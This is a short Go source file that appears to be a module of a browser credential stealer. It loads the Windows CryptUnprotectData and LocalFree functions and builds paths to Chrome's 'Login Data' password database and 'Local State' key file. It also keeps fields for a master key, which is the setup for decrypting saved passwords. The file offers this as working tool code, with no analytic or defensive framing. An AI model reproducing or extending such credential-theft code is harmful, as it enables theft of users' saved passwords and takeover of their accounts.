package utils

import (
	"os"
	"syscall"
)

type Data struct {
	DllCrypt32      *syscall.LazyDLL
	DllKernel32     *syscall.LazyDLL
	ProcDecryptData *syscall.LazyProc
	ProcLocalFree   *syscall.LazyProc
	DataPath        string
	LocalStatePath  string
	MasterKey       []byte
	KeyG            string
}

func AllData() Data {
	dllcrypt32 := syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 := syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData := dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree := dllkernel32.NewProc("LocalFree")

	dataPath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	localStatePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

	return Data{
		DllCrypt32:      dllcrypt32,
		DllKernel32:     dllkernel32,
		ProcDecryptData: procDecryptData,
		ProcLocalFree:   procLocalFree,
		DataPath:        dataPath,
		LocalStatePath:  localStatePath,
		MasterKey:       nil,
		KeyG:            "",
	}
}
